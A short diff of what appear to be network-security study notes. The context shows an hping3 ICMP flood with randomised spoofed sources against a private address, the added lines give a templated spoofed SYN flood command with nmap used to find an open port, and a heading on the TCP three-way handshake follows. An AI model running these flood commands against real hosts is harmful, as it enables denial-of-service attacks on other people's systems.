@@ -3,6 +3,10 @@
 hping3 -1 --flood --rand-source -c 10000 192.168.68.107 
 
 
+hping3 -S [source IP] -a [target IP] -p [open port] --flood
+
+open port - nmap [target IP]
+
 13. TCP three-way handshake.
 
  The process involves three steps:
